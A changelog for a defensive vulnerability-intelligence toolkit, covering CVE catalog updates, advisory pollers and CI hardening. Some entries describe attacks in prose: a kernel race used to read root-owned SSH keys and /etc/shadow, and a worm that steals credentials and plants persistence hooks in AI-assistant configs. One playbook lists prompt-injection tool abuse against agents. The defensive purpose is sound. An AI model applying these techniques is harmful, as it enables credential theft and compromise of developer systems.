**2 stuck-draft CVEs removed from catalog.** `MAL-2026-ANTHROPIC-MCP-STDIO` was a `_quarantine: true` duplicate of the verified `CVE-2026-30623` (Anthropic MCP SDK stdio command-injection). `CVE-2026-GTIG-AI-2FA` was a `_draft: true` placeholder for an embargoed/un-assigned CVE id. Both removed. Cross-references updated in `data/exploit-availability.json`, `data/framework-control-gaps.json` (inline text in `NIST-AI-RMF-MEASURE-2.7`), `data/_indexes/chains.json` (regenerated), `data/zeroday-lessons.json`. Catalog state now **38/38 verified, 0 drafts**.

### Features

**README.md catches up with v0.13.0 → v0.13.3 operator surface.** New documentation for: `exceptd watchlist --alerts` (CVE-class pattern matcher; 5 patterns), `exceptd watchlist --org-scan` (GitHub repo-pattern monitoring per NEW-CTRL-052; `--org`, `--pattern`, `GITHUB_TOKEN` env var), `exceptd doctor --ai-config` (file-mode audit per NEW-CTRL-050; walks ~/.claude / ~/.cursor / ~/.codeium / ~/.aider / ~/.continue), `exceptd refresh --check-advisories` (8-feed primary-source poller: Qualys / RHSA / USN / ZDI / kernel-org / oss-security / JFrog / CISA), and the daily scheduled `exceptd-threat-intake` remote agent. Playbook count updated 16 → 20 with the 4 v0.13.0 additions named. Legacy verb table split into "Removed in v0.13.0" (5 verbs) vs "Aliases — still functional, no removal scheduled" (10 verbs). Watchlist now has a first-class CLI block instead of the prior "no replacement yet" stub.

**AGENTS.md catches up.** Two new sections:
- **New Control Requirements** — table documenting NEW-CTRL-048 through NEW-CTRL-055 with name, surfacing zero-day, and coverage gap closed. Skill bodies should cite the IDs rather than paraphrase the upstream description.
- **Operational threat-intake cadence** — documents the daily `exceptd-threat-intake` routine, the sequence it runs (`refresh --check-advisories` → `watchlist --alerts` → `refresh --apply` → `refresh --advisory <CVE-ID>` for up to 5 new IDs → PR), and operator instructions for one-off triage.

CLI reference table extended: `exceptd brief --all` row updated 16 → 20 playbooks; `exceptd attest diff <sid>` row updated to describe `reattest` as a preserved short-form alias; `exceptd doctor` row added `--ai-config`; two new rows added for `exceptd refresh --check-advisories` and `exceptd watchlist`. Quick Skill Reference table replaced legacy `node orchestrator/index.js watchlist` invocation with `exceptd watchlist`.

### Internal

- 18 new tests: `tests/v0_13_4-fixes.test.js` (13 pins covering Phases A / C / E), `tests/doctor-ai-config-substantive.test.js` (5 fixture-driven tests, POSIX-only), `tests/watchlist-org-scan-substantive.test.js` (5 envelope-shape tests).
- Test-count baseline refreshed.
- Predeploy: 15/15 gates green; both `validate-playbooks` and `lint-skills` now run warning-free.

## 0.13.3 — 2026-05-18

Audit close-out continuation: the items the prior pass marked for follow-up. Workflow hardening, lint enforcement promoted from warning to hard error, two new operator-facing health checks for the Shai-Hulud lesson controls, and 4 more primary-source pollers covering kernel.org / oss-security / JFrog / CISA.

### Security

**`refresh.yml` split into two jobs — `refresh-data` (no write credentials) + `open-pr` (contents:write + pull-requests:write + issues:write scoped to PR creation only).** Pre-split a single `refresh` job carried write capability against the repo throughout the long-running data-parse + prefetch + apply + predeploy sequence; a compromise of any of those steps had repo-write access during the whole run. The new shape scopes write capability to the few-second PR-creation window. Data mutations flow between jobs via an upload-artifact / download-artifact bundle. The `refresh-data` checkout now uses `persist-credentials: false`.

**`lib/lint-skills.js` Hard Rule #1 body-scan flipped from warning to hard error.** v0.13.2 introduced the body-scan as a warning while the 2 pre-existing violations were triaged. Both are now resolved (`CVE-2024-21762` landed in the catalog with full Hard Rule #1 fields; the placeholder `CVE-2026-21370` reference was removed from `cloud-iam-incident`). The body-scan now errors when a skill cites a CVE not in the catalog. Draft references continue to surface as warnings.

### Features

**`exceptd doctor --ai-config` audits AI-assistant config-file permissions.** Implements NEW-CTRL-050 from the MAL-2026-SHAI-HULUD-OSS zeroday-lessons entry. Walks `~/.claude`, `~/.cursor`, `~/.codeium`, `~/.aider`, `~/.continue` for sensitive files (`settings.json`, `mcp.json`, `*.mcp_config.json`, `api_key*`, `*.token`, `*.credentials`) and reports any not at mode 0600 on POSIX. On Windows the mode bits aren't load-bearing; each sensitive file is flagged with an info-level "manual ACL review" note. Opt-in via `--ai-config`; doesn't run as part of the default no-flag doctor pass.

**`exceptd watchlist --org-scan` probes GitHub for threat-actor repo naming patterns.** Implements NEW-CTRL-052 from the MAL-2026-SHAI-HULUD-OSS zeroday-lessons entry. Queries the GitHub Search API for repos matching the canonical Shai-Hulud / TeamPCP patterns ("A Gift From TeamPCP", "Shai-Hulud", "TeamPCP") scoped to `--org <login>`. Custom patterns via repeatable `--pattern <s>`. Set `GITHUB_TOKEN` env var for private-repo coverage and higher rate limit; without it, public-repo search only.

**4 more primary-source advisory pollers.** `lib/source-advisories.js` `FEEDS` grew 4 → 8:
- `kernel-org` — torvalds/linux master commits atom feed. Catches the CVE-2026-46333 / ssh-keysign-pwn class at T+0, the moment the upstream fix lands. The v0.13.1 post-mortem identified this as the exact venue we missed.
- `oss-security` — openwall.com `oss-security` mailing list atom feed. Coordinated-disclosure venue; many distro advisories announce CVEs here days before NVD enrichment.
- `jfrog` — JFrog SecOps research blog feed. npm / PyPI / Maven supply-chain disclosures with CVE assignments (TanStack / Mini Shai-Hulud class).
- `cisa-current` — CISA cybersecurity advisories feed (federal-vendor coordinated disclosures, separate from KEV which captures only exploited-in-the-wild items).

### Bugs

**`CVE-2024-21762` (Fortinet FortiOS SSL-VPN preauth RCE) added to catalog.** Was cited in skill prose without a backing catalog entry — surfaced by the v0.13.2 Hard Rule #1 body-scan. Full Hard Rule #1 fields (CVSS 9.8, CISA KEV 2024-02-09, public PoC, confirmed mass exploitation across multiple APT clusters, FortiOS patch versions 7.6.2 / 7.4.7 / 7.2.11 / 7.0.17 / 6.4.16). RWEP 85. Includes the 2025-04 follow-up advisory documenting symlink persistence that survives firmware patching.

**`CVE-2026-21370` placeholder reference removed from `skills/cloud-iam-incident/skill.md`.** No record of CVE-2026-21370 in any source; was a class-marker parenthetical for the Azure managed-identity token-replay attack class. Rewritten as "design-class issue, not a single CVE" so the prose still accurately describes the IMDS-token-theft pattern without inventing threat intel.

**12 framework-gap forward-orphan references closed.** Each pre-existing orphan got a real gap entry with theater_test per Hard Rule #6: `CIS-Kubernetes-Benchmark-4.2.13`, `CIS-Kubernetes-Benchmark-5.3`, `CIS-Controls-v8-Control6`, `ISO-27001-2022-A.5.15`, `ISO-27001-2022-A.8.13`, `NIST-800-53-IA-2`, `NIST-AI-RMF-MEASURE-2.7`, `OWASP-ML-Top-10-2023-ML06`, `NIS2-Art21-network-security`, `NIS2-Art21-business-continuity`, `PCI-DSS-4.0-5.1`, `AU-ISM-1808`. Gap catalog 130 → 142 entries; orphan count for `framework-control-gaps.json` is now 0.

**2 empty-`data_deps` skills fixed.** `api-security` and `email-security-anti-phishing` previously had empty `data_deps` because the bodies referenced no catalog file by name. Each now carries 6 catalog references (atlas-ttps, attack-techniques, cwe-catalog / dlp-controls, d3fend-catalog, framework-control-gaps, rfc-references) threaded through the body in 4 new prose passages each. Every cited ID resolves to a real entry in its respective catalog. `last_threat_review` bumped to 2026-05-18.

### Internal

- 8 new tests in `tests/v0_13_3-fixes.test.js` covering all 5 phases.
- Test-count baseline refreshed to match the new test surface.
- ADVISORIES_SOURCE test-fixture extended to include the 4 new feeds.
- `tests/source-advisories.test.js` `FEEDS: exactly N feeds` pin updated 4 → 8.

## 0.13.2 — 2026-05-18

Audit close-out: the remaining v0.13 deferrals from the original 6-domain audit + the v0.13.1 post-mortem follow-ups. Patch-class — additive across CI hardening, lint enforcement, CLI UX, predeploy gates, catalog data cleanup, and skill metadata.

### Security

**`release.yml` publish job split: `publish-npm` (id-token:write only) + `publish-github-release` (contents:write only).** Pre-v0.13.2 a single `publish` job carried BOTH permissions at once — a compromise of any step in that job (leaked NODE_AUTH_TOKEN, malicious dependency in the runner image, third-party action with elevated trust) had access to the npm provenance signing identity AND repo-write simultaneously. The new shape isolates each permission to the minimum surface that needs it. `publish-github-release` depends on `publish-npm` so the GitHub Release only fires when npm publish succeeded — releases pointing at a tag whose npm publish failed are operator-confusing.

### Features

**`exceptd watchlist --alerts` 5 patterns now stable.** No change in v0.13.2; documenting that the v0.13.1 patterns are now operationally proven against the post-mortem seeds (`CVE-2026-46333` ssh-keysign-pwn surfacing under `kernel_lpe_with_poc`; `MAL-2026-SHAI-HULUD-OSS` under `supply_chain_family`).

**Flag-value did-you-mean across 6 sites.** `run --mode`, `brief --phase`, `run --format`, `attest export --format`, `ci --format`, and orchestrator `report <format>` now surface a Levenshtein-≤2 typo suggestion in the structured error body alongside the accepted-set list. JSON shape: `{ok:false, error, provided, accepted, did_you_mean:["..."]}`. Example: `brief library-author --phase goven` → `did_you_mean: ["govern"]`.

**`lib/lint-skills.js` Hard Rule #1 body-scan.** Every `CVE-* / MAL-*` reference in skill prose is now resolved against the canonical catalog. Missing-from-catalog surfaces as a WARNING in v0.13.2 (will hard-fail in v0.14.0); `_draft:true` references surface as WARNING. The forcing function lands; pre-existing violations on `ransomware-response` (CVE-2024-21762) and `cloud-iam-incident` (CVE-2026-21370) don't block the release but are now visible in every lint run.

**`scripts/check-test-count.js` — new 15th predeploy gate.** Static-counts `test(` declarations across `tests/*.test.js` and refuses shrinkage beyond the configured tolerance (default 1). Baseline pinned in `tests/.test-count-baseline.json`. Catches accidentally-deleted test files / mass-skip mistakes that the lint + diff-coverage gates wouldn't surface. Initial baseline 924 declarations across 94 files; bump with `--update-baseline` on releases that legitimately add many tests.

**Skill `discovery_mode: standalone` frontmatter field.** 16 skills that are intentionally reached via `exceptd brief <name>` or `exceptd ask` rather than playbook `skill_chain` now carry the explicit marker. Closes the v0.12 audit gap that flagged these as "unreferenced" — operator intent now explicit. Affected: `age-gates-child-safety`, `ai-risk-management`, `defensive-countermeasure-mapping`, `email-security-anti-phishing`, `fuzz-testing-strategy`, `mlops-security`, `ot-ics-security`, `researcher`, `sector-energy`, `sector-federal-government`, `sector-telecom`, `skill-update-loop`, `threat-model-currency`, `threat-modeling-methodology`, `webapp-security`, `zeroday-gap-learn`.

### Bugs

**14 still-draft CVEs flipped to verified.** Each got a matching `zeroday-lessons.json` entry (the AGENTS.md rule #6 requirement) and had `_draft` removed: `CVE-2024-3154` (CRI-O kernel-module load), `CVE-2023-43472` (MLflow path-traversal), `CVE-2020-10148` (SUNBURST), `CVE-2023-3519` (Citrix NetScaler unauth RCE), `CVE-2024-1709` (ConnectWise ScreenConnect), `CVE-2026-20182` (Cisco SD-WAN), `CVE-2024-40635` (containerd integer overflow), `CVE-2026-30623` (Anthropic MCP SDK stdio injection), `CVE-2025-12686` (Synology BeeStation Pwn2Own), `CVE-2025-62847` / `CVE-2025-62848` / `CVE-2025-62849` (QNAP QTS DEVCORE chain), `CVE-2025-59389` (QNAP Hyper Data Protector), `CVE-2025-11837` (QNAP Malware Remover). Three new control requirements introduced where the CVE surfaced a novel class: `NEW-CTRL-053` MCP-SERVER-CONFIG-ALLOWLIST, `NEW-CTRL-054` BACKUP-TIER-NETWORK-ISOLATION, `NEW-CTRL-055` SECURITY-TOOL-INTEGRITY-VERIFICATION. Catalog now 37/39 entries verified; 2 remaining drafts are quarantined / embargoed placeholders.

**8 framework-gap forward-orphan refs cleaned up.** The v0.13.0 Hard Rule #5 backfill surfaced 8 framework-control gap IDs cited by CVE entries' `framework_control_gaps` field but missing from `framework-control-gaps.json`. All 8 added with theater_test blocks per Hard Rule #6: `NIST-800-53-SC-39` (Process Isolation), `ISO-27001-2022-A.8.22` (Segregation of networks), `CIS-Kubernetes-Benchmark-5.7` (Network Policies), `NIST-800-218-SSDF-PW.4` (Reuse Existing, Well-Secured Software), `NIST-800-53-SR-3` (Supply Chain Controls), `SLSA-v1.0-Source-L3`, `NIST-AI-RMF-MAP-3.4`, `OWASP-Top-10-2021-A06`. Gap catalog 122 → 130 entries.

**`release.yml` CHANGELOG-extraction fallback now emits `::warning::`.** Surfaces the parse failure on the run page rather than silently shipping a generic body.

### Internal

- 11 new tests in `tests/v0_13_2-fixes.test.js`. Test count baseline 924 (initial pin).
- Predeploy gate count 14 → 15.
- `refresh.yml` split-checkout pattern (persist-credentials hardening) deferred to v0.14 — needs peter-evans/create-pull-request auth-mode research first.

## 0.13.1 — 2026-05-17

Threat-intake gap closure. Driven by the post-mortem on CVE-2026-46333 (ssh-keysign-pwn) — disclosed 2026-05-14 by Qualys, missed by the toolkit at T+0 through T+3 because the existing source set (KEV, EPSS, NVD, RFC, PINS, GHSA, OSV) sits at the END of the disclosure pipeline. Adds primary-source polling, CVE-class alert surfacing, and seeds two retroactive catalog entries for the disclosures the toolkit should have caught.

### Features

**`refresh --check-advisories` polls 4 primary-source feeds.** New `ADVISORIES_SOURCE` in `lib/source-advisories.js` polls Qualys TRU RSS, Red Hat RHSA CSAF index, Ubuntu USN RSS, and Zero Day Initiative published-advisories RSS. Surfaces CVE IDs disclosed at T+0 to T+1 that lag NVD enrichment by 3-14 days. Report-only by design: the source emits structured `diffs[]` with `{cve_id, sources[], advisory_urls[], disclosed_at, title}` but does NOT auto-mutate the catalog. Operators route promising CVE IDs through the existing `refresh --advisory <CVE-ID>` enrichment path. Deduplicates across feeds (a CVE cited in both Qualys and USN collapses to one diff with two source attributions). Fixture-mode (`ctx.fixtures.advisories`) + cache-mode (`<cacheDir>/advisories/<feed>.xml`) for offline test reproducibility.

**`exceptd watchlist --alerts` surfaces CVE-class pattern matches.** Re-scopes `watchlist` from "skills forward_watch aggregation" to "CVE catalog pattern alerts" when `--alerts` is passed. 5 patterns ship in v0.13.1:
- `kernel_lpe_with_poc` (high) — Linux kernel LPE class with public PoC + `blast_radius >= 25`
- `supply_chain_family` (high) — `MAL-*` entries or `type: malicious-*`
- `ai_discovered_kev` (high) — AI-discovered AND on CISA KEV
- `active_exploitation_unpatched` (critical) — confirmed in-the-wild + no patch available
- `recent_poc_no_kev_yet` (medium) — public PoC verified within 14 days, not yet KEV-listed

Output sorts critical-severity first, then by RWEP descending. JSON envelope shape matches the v0.13.0 harmonization contract `{ok, verb, mode, generated_at, patterns_evaluated, entries_scanned, alert_count, alerts[]}`.

**Daily scheduled threat-intake routine.** A `routine: exceptd-threat-intake` (claude.ai remote agent) runs daily at 14:00 UTC (07:00 PDT). Sequence: `npm install` → `refresh --check-advisories` → `watchlist --alerts` → `refresh --apply` → `refresh --advisory <CVE-ID>` for up to 5 new CVE IDs from the primary-source feeds → re-sign + rebuild-indexes if catalog mutated → commit on `intake/<YYYY-MM-DD>` branch with full diff in the report. Closes the cadence-gap that left the toolkit dependent on operator-triggered intake. Operator-managed at https://claude.ai/code/routines.

### Bugs

**Two retroactive catalog seeds for the post-mortem disclosures.**

`CVE-2026-46333` (ssh-keysign-pwn) — Linux kernel ptrace exit-race. `exit_mm()` runs before `exit_files()` during privileged-process shutdown; the pre-fix `__ptrace_may_access()` skipped its `get_dumpable()` check when `task->mm == NULL`, leaving a microsecond window where an unprivileged attacker can race `ssh-keysign` or `chage` exit + use `pidfd_getfd(2)` to duplicate root-owned file descriptors and read `/etc/ssh/ssh_host_*_key` or `/etc/shadow`. Two public PoCs from `_SiCk` (2026-05-14). Upstream fix commit `31e62c2ebbfd` merged 2026-05-14; kernel point releases 2026-05-15. RWEP 30 (no KEV yet; +20 PoC, +25 blast_radius, -15 patch; reboot-required). 6-year dormant logic bug — originally surfaced in a 2020 Jann Horn patch proposal that was never merged. Yama `ptrace_scope` is NOT a compensating control (bypass is at the kernel access-check layer, not the LSM layer). Mitigation matrix: patch + reboot (preferred) | KernelCare livepatch when released | `sysctl kernel.user_ptrace=0` | SUID removal from `ssh-keysign` + `chage`. Matching `zeroday-lessons.json` entry adds two new control requirements: `NEW-CTRL-048` (kernel-exit-race-CVE-class audit monitoring) + `NEW-CTRL-049` (SUID minimization for kernel-LPE carrier binaries).

`MAL-2026-SHAI-HULUD-OSS` — TeamPCP open-sourced the Shai-Hulud worm framework to GitHub on 2026-05-12 under MIT license, paired with a BreachForums $1,000 USD (Monero) bounty contest for downstream supply-chain impact. The September 2025 / November 2025 / May 2026 "Mini Shai-Hulud" waves are the in-the-wild adoption signal. Modular TypeScript / Bun toolkit for credential harvesting (AWS / GCP / Azure / GitHub / AI-assistant configs) + supply-chain poisoning + encrypted exfil; targets CI/CD pipelines and developer workstations. Self-replicates via maintainer-token-pivot: stolen npm token authenticates as compromised maintainer, enumerates other packages owned, publishes malicious versions. **Explicitly targets AI-coding-assistant config files** — reads `~/.cursor/mcp.json`, `~/.codeium/windsurf/mcp_config.json`, `~/.claude/settings.json`, and installs Claude Code startup hooks for persistence. IoC pattern: GitHub repos named "A Gift From TeamPCP", commit timestamps falsified to 2099-01-01, accounts `agwagwagwa` / `headdirt` / `tmechen`. RWEP 70 (active exploitation confirmed via Mini Shai-Hulud wave; copycat modifications observed within hours of release; AI-assist factor for the framework itself). Matching `zeroday-lessons.json` entry adds three new control requirements: `NEW-CTRL-050` (AI-assistant config-file permission lockdown to 0o600) + `NEW-CTRL-051` (npm publish token workstation isolation) + `NEW-CTRL-052` (GitHub repo-pattern monitoring for exfil channels). `MAL-2026-TANSTACK-MINI` cross-referenced as a Mini-Shai-Hulud-wave incident predating the public framework release by ~24h.

### Internal

- 24 new tests in `tests/source-advisories.test.js` (18 tests covering parsers + the SOURCE contract) + `tests/watchlist-alerts.test.js` (6 tests covering envelope shape, pattern coverage, sort order, anchor surfaces).
- The schedule-agent setup is operational — no code change to ship; documented in this entry for operator awareness.
- Phase A of the post-mortem fix landed in this release; primary-source polling and alert surfacing close the "T+0-to-T+3 disclosure → catalog" gap from the 3-source-set side. The remaining cadence-gap (operator-triggered intake) is closed by the scheduled remote agent.

## 0.13.0 — 2026-05-17

Minor release. Breaking-change bundle for the v0.10.x legacy-verb removal that has been deprecation-bannered since v0.11.0; envelope harmonization across every JSON-emitting verb; 4 new playbooks expanding the canonical set to 20; engine hardening (factor-shape validation, cache invalidation, fsync-on-rename, deterministic SBOM); schema reverse fields on ATLAS, ATT&CK, and the playbook chain.

### Breaking changes — migration required

**Five v0.10.x legacy verbs hard-removed: `plan`, `govern`, `direct`, `look`, `ingest`.** They were deprecation-bannered since v0.11.0 and slated-for-removal-in-v0.13 since v0.12.0. Operators on v0.10.x → v0.13.0 now get a structured `ok:false` refusal with the v0.11+ replacement command. Each removal is a pure rename — same underlying capability is reachable via the replacement. Refusal body shape:

```json
{
  "ok": false,
  "error": "'plan' was removed in v0.13.0. Use `exceptd brief --all` instead.",
  "verb": "plan",
  "removed_in": "0.13.0",
  "replacement": "brief --all",
  "deprecation_history": "Deprecated in v0.11.0 ... removed in v0.13.0."
}
```

Replacements:
- `exceptd plan` → `exceptd brief --all`
- `exceptd govern <pb>` → `exceptd brief <pb> --phase govern`
- `exceptd direct <pb>` → `exceptd brief <pb> --phase direct`
- `exceptd look <pb>` → `exceptd brief <pb> --phase look`
- `exceptd ingest <args>` → `exceptd run <args>`

`reattest` and `list-attestations` were also deprecation-bannered but are PRESERVED — they remain canonical short-form routings of `attest diff` / `attest list` and stay functional.

The deprecation-banner + tempdir-marker mechanism (added v0.11.0, persisted via `EXCEPTD_DEPRECATION_SHOWN` env var + `exceptd-deprecation-shown-v<X.Y.Z>` tempdir marker) is removed. Pre-v0.13 scripts that pinned the banner shape should remove those assertions.

**Orchestrator exit-code class change: usage errors exit 1 (`GENERIC_FAILURE`), not 2 (`DETECTED_ESCALATE`).** Affected verbs: `framework-gap` (missing args), `report <format>` (unknown format), `validate-cves` / `validate-rfcs` (catalog-read failure), `watchlist` (manifest-read failure), `skill <name>` (skill-not-found). Pre-v0.13 these exited 2, colliding with the canonical CI contract where exit 2 means "verb ran and detected an escalation-worthy finding." CI gates wired to branch on exit 2 will need to also accept exit 1 for these verbs, OR pre-validate inputs before invocation.

**Envelope harmonization: every JSON-emitting verb now carries top-level `ok` and (where applicable) `verb`.** Pre-v0.13 `brief --all`, `watchlist`, `ci`, `doctor`, `discover`, `attest show`, `attest export`, and `cmdRunMulti` omitted one or both fields inconsistently. `emit()` now defaults `ok: true` when not set (symmetric to the existing `ok: false → exit 1` fallback), and per-verb call sites set `verb: "..."` explicitly. Consumers that parsed bodies for the absence of these fields will break; consumers reading specific known fields are unaffected.

**Orchestrator `ok:false` bodies now land on stdout (not stderr).** Aligns with the bin/exceptd.js convention so a single consumer can parse the verb's envelope without splitting across two streams. Advisory text (`[verb] hint: ...`) still goes to stderr.

### Security

**`lib/sign.js` `generateKeypair()` ACL-hardening status surfaces in CLI output.** `restrictWindowsAcl()` now returns a boolean; the verdict line announces `Windows ACL hardened: yes|NO` rather than silently warning.

**`lib/cve-curation.js` + `lib/refresh-external.js` `writeJsonAtomic()` fsync before rename.** Pre-v0.13 a power loss between the tmp-write and the rename could leave the renamed destination zero-length / partial. The open + write + fsync + close + rename idiom closes the durability gap on both atomic-write helpers.

### Features

**4 new playbooks expand the canonical set to 20.**
- `webhook-callback-abuse` — OAuth callback hijack, inbound-webhook signature validation, Slack/Teams/Discord webhook leakage, the Snowflake-class long-lived-callback-token-in-CI-log pattern.
- `cicd-pipeline-compromise` — self-hosted runner takeover, workflow-injection (the `${{ inputs.* }}` class), third-party Action SHA-pin discipline, OIDC trust-policy abuse, runner-scoped signing keys. Distinct from `sbom` (package-registry supply chain).
- `identity-sso-compromise` — in-progress IdP-plane detection (Salt Typhoon / Scattered Spider / Okta-2023 / golden-SAML / PRT theft patterns). Detect-side counterpart to the existing `idp-incident` (response playbook).
- `llm-tool-use-exfil` — agentic-AI tool abuse via prompt injection. Auto-approve-on-high-impact-tool, instruction-coercion grammar in tool responses, unprompted tool chains, credential-shadow in tool args. Distinct from `dlp-exfiltration` (enterprise DLP) and `mcp` (install-time tool trust).

Each new playbook carries `threat_currency_score >= 90`, full air-gap alternatives on look artifacts, substantive theater_test blocks on framework gaps, and `feeds_into[]` chains into the existing playbook set.

**Schema reverse fields populated across 3 catalogs + playbooks.**
- ATLAS TTPs now carry `cve_refs[]` (11 entries populated with 21 back-edges from `cve.atlas_refs`).
- ATT&CK techniques now carry `cve_refs[]` (20 entries populated with 56 back-edges from `cve.attack_refs`).
- Every playbook now carries `_meta.fed_by[]` (11 playbooks populated with 54 back-edges from `_meta.feeds_into[].playbook_id`). Operators reading a playbook can see what chains INTO it without grepping every other playbook.

`scripts/refresh-reverse-refs.js` extends to 8 reverse-direction passes (4 manifest-driven, 2 CVE-driven, 2 catalog-back-edge, 1 playbook-back-edge); `npm run refresh-reverse-refs` rebuilds the full set in one pass.

**`lib/scoring.js validate()` refuses mixed Shape A / Shape B factor sets.** The catalog historically stored `rwep_factors` in two distinct shapes (raw booleans + post-weight integers). Mixing shapes inside one entry silently broke the sum invariant — a CVE with `cisa_kev: true, blast_radius: 30` reported rwep 30 instead of the operator-intended 55. The new `detectFactorShape()` helper detects mixed entries and emits a structured error pointing at the affected CVE id.

**`lib/cross-ref-api.js` cache invalidation uses (mtime, size) tier.** Pre-v0.13 cache invalidation was mtime-only; on filesystems with 1-2s mtime granularity (FAT32, HFS+ pre-APFS, NFSv3, Docker bind-mounts that proxy mtime) a rapid refresh-then-reload within the same second served stale data. Adding `size` catches every content change that affects byte count.

**`lib/lint-skills.js` enforces `last_threat_review` staleness gate.** Warn at >180 days; hard fail at >365 days. Operators with stale skills get a structured warning naming the affected file + the exact day count; year-stale skills fail the lint outright. The forcing function for Hard Rule #8 (which was policy-only pre-v0.13).

**`scripts/refresh-sbom.js` produces a deterministic bundle.** `metadata.timestamp` and `serialNumber` are derived from the content-hash seed (`<name>@<version>@<bundleSha>`) instead of wall-clock. Identical content → identical SBOM across re-runs. The SBOM-currency predeploy gate can now rely on byte-identity for the no-change case.

**`exceptd doctor --fix` second remediation branch: post-rotate stale signatures.** Continues the v0.12.41 fix. When the private key IS present but the signatures check fails (the `generate-keypair --rotate` followup state), `doctor --fix` runs `sign-all` to re-sign skills + manifest against the current keypair. Without this branch the rotation flow would converge to a broken-but-not-self-healing state.

### Bugs

**3 catalogs got `last_threat_review` fields backfilled.** `exploit-availability.json`, `global-frameworks.json`, `zeroday-lessons.json` carried `last_updated` but lacked the threat-review timestamp the other 8 catalogs use. All 11 now follow the same shape.

**`active_exploitation` field vocabulary now declared in `cve-catalog.json._meta`.** Pre-v0.13 the field accepted free-form values; 10 entries used `"unknown"` which wasn't documented. The new `_meta.active_exploitation_vocabulary` block enumerates `confirmed | suspected | theoretical | none | unknown` with per-value definitions.

**4 CVEs flipped `_draft: false` (verified).** `CVE-2024-3094` (xz-utils backdoor), `CVE-2024-21626` (Leaky Vessels), `CVE-2026-42945` (NGINX Rift), `MAL-2026-TANSTACK-MINI`. 1 quarantined (`MAL-2026-ANTHROPIC-MCP-STDIO` — duplicate of `CVE-2026-30623`). The remaining 15 draft CVEs are now marked with a structured `_draft_reason` ("blocked on missing zeroday-lessons entry" in all 14 cases except the GTIG embargoed placeholder).

**Hard Rule #5 regional-framework backfill on 7 skills.** `policy-exception-gen`, `compliance-theater`, `exploit-scoring`, `ai-c2-detection`, `ai-attack-surface`, `mcp-agent-trust`, `api-security` previously cited NIST without one or more of EU/UK/AU/ISO equivalents. Each now carries substantive references to NIS2/DORA/EU AI Act, NCSC CAF, ASD ISM/Essential 8, and ISO 27001:2022 controls as appropriate.

**39 of 42 skills got `data_deps` arrays regenerated** from body content references. Pre-v0.13 the array drifted whenever a skill body added or removed a `data/<file>.json` reference without the frontmatter being updated. `api-security` and `email-security-anti-phishing` ended up with empty `data_deps` — their bodies reference no catalog file by name; flagged for v0.14 body-content review.

**`scripts/refresh-reverse-refs.js` orphan detection caught 8 framework-gap forward-orphan references introduced by the Hard Rule #5 backfill.** `NIST-800-53-SC-39`, `ISO-27001-2022-A.8.22`, `CIS-Kubernetes-Benchmark-5.7`, `NIST-800-218-SSDF-PW.4`, `NIST-800-53-SR-3`, `SLSA-v1.0-Source-L3`, `NIST-AI-RMF-MAP-3.4`, `OWASP-Top-10-2021-A06`. These are real framework controls cited by the new skill content but absent from the gap catalog; tracked for v0.14 gap-catalog expansion.

### Internal

- `lib/exit-codes.js` exports `safeExit(code)` — sets `process.exitCode` without calling `process.exit()`. Dispatch surface (`bin/exceptd.js`, `orchestrator/index.js`) converted from `process.exit(N)` to `safeExit(EXIT_CODES.X)` for non-zero codes; `tests/safe-exit-grep.test.js` refuses regressions.
- `validate-playbooks` predeploy gate flipped from informational to required. 20/20 playbooks validate cleanly.
- 7 new pinning tests in `tests/v0_12_41-fixes.test.js`, `tests/safe-exit-grep.test.js`, `tests/atlas-version-canonical.test.js`, `tests/operator-leak-grep.test.js`, `tests/verify-shipped-tarball-wrapper.test.js`.
- Test suite: 1179 total, 1173 pass, 6 skipped (POSIX-only / no-privkey gates), 0 fail.
- `release.yml` publish-job split (id-token:write vs contents:write separation) and `refresh.yml` split-checkout pattern remain in v0.14 backlog; they're workflow-security hardening with no operator-facing surface change.

## 0.12.41 — 2026-05-17

Cross-domain hygiene pass: signature-regression class fix, sidecar hardening, attestation UX, ATLAS pin reconciliation, operator-narrative scrub, and structural test pins to lock the class fixes against future drift.

### Security

**`doctor --fix` now refuses when `keys/public.pem` exists without a matching private key, AND detects post-rotation stale signatures.** Pre-fix the production code path silently invoked `generateKeypair()` whenever the private key was missing, overwriting the shipped `keys/public.pem` and orphaning every existing signature. This is the same class of bug that broke five v0.11.x → v0.12.2 releases — an operator running the canonical fix command would get a working keypair locally and a broken `exceptd doctor` for every subsequently shipped install. Now: refusal is explicit with a structured `fix_attempted: ed25519_keypair_generation_declined` reason and an actionable hint pointing at `--rotate`. After successful generation, `doctor --fix` chains `sign-all` so the manifest + skills carry signatures paired with the new keypair (without the chain, the very next `doctor` reports 0/N passing). Second branch: when the private key IS present but the signatures check fails (the post-`generate-keypair --rotate` state — the rotation flow's remediation), `doctor --fix` runs `sign-all` to re-sign skills + manifest against the current keypair. Without this second branch, `--rotate` would converge to a broken-but-not-self-healing state.

**Attestation sidecar `.sig` files now write at mode `0o600` + Windows ACL hardening.** v0.12.38 hardened the primary attestation JSON; the sibling `.sig` sidecars that ride alongside were missed and inherited the default umask (0o644 on POSIX, default ACL on Windows). On multi-tenant hosts the sidecar leaked the signature payload. Both the signed and unsigned-stub write paths now match the attestation.json hardening.

### Bugs

**`attest <subverb>` typos now return `did_you_mean[]`.** Pre-fix `exceptd attest verfy <sid>` collapsed into a downstream "no session dir" error because subverb membership was checked after session-id resolution. Now the subverb gate runs first and returns a Levenshtein-1 suggestion (`{ did_you_mean: ["verify"], accepted_subverbs: ["list","show","export","verify","diff"] }`). Closes the typo-suggestion class introduced by v0.12.37 for top-level verbs.

**`attest diff <sid> --against <other>` guards against empty `attestations[]`.** Pre-fix a session directory containing only replay records (no `attestation.json`) caused `cmdAttest diff` to throw `TypeError: Cannot read properties of undefined (reading 'captured_at')`. Now: structured `ok:false` with `attestation_count: 0` and a hint pointing at `exceptd attest show <sid>` for visibility.

**`exceptd ask "..." --pretty` now honors `--pretty`.** Pre-fix the flag was silently ignored unless paired with `--json` (the discover/doctor convention is `--pretty` opts into structured output). Aligns the three verbs.

**`lib/scoring.js` `compare()` distinguishes "no scoring signal" from "broadly aligned".** Pre-fix a CVE entry with `rwep_score: 0` AND `cvss_score: 0` (e.g. an unmigrated catalog entry) printed "CVSS and RWEP are broadly aligned" — false alignment signal that masked a catalog gap. Now: explicit "no scoring signal — investigate catalog entry" branch.

**`normalizeSubmission` no longer mutates frozen input.** The `_runErrors` push for `signal_overrides_invalid` previously mutated the caller's submission in place; a frozen submission (defensive `Object.freeze`, or shared reference across parallel runs) threw uncaught. Now clones before mutation.

